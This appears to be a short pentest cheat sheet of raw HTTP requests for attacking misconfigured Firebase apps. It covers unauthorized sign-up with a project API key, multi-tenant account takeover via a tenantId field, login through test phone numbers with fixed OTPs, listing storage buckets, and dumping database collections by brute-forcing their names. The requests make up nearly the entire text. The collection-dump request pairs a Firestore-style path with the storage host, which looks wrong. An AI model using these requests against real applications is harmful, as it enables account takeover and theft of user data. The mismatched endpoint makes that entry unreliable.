
### Unintended User Sign-Up to the Application via Alternate Path 
```http
POST /v1/accounts:signUp?key=<API_KEY> HTTP/2
Host: identitytoolkit.googleapis.com
Content-Length: 57

{
	"email":"test@email.com",
	"password":"123456"
}
```

### Account Takeover in Multi Tenancy Firebase Applications
```http
POST /v1/accounts:signUp?key=<API_KEY> HTTP/2
Host: identitytoolkit.googleapis.com
Content-Length: 57

{
	"email":"test@email.com",
	"password":"123456",
	"tenantId":"test"
}
```

### Access to Accounts with Pre-configured Mobile Numbers with Fixed OTPs
```json
Number: +1 8888888888 OTP: 888888
Number: +91 9999999999 OTP: 999999
```

### Access to Storage Files on Firebase
```http
GET /v0/b/<STORAGE_BUCKET>/o/ HTTP/2
Host: firebasestorage.googleapis.com
Authorization: Bearer <ID_TOKEN>
```

### Full Dump of Collections and Associated Documents
```http
GET /v1/projects/<PROJECT_ID>/databases/{default}/documents/<COLLECTION_NAME> HTTP/2
Host: firebasestorage.googleapis.com
Authorization: Bearer <ID_TOKEN>
```
NOTE: We have to Brute force COLLECTION_NAME and there is missing Rate Limiting on this endpoint


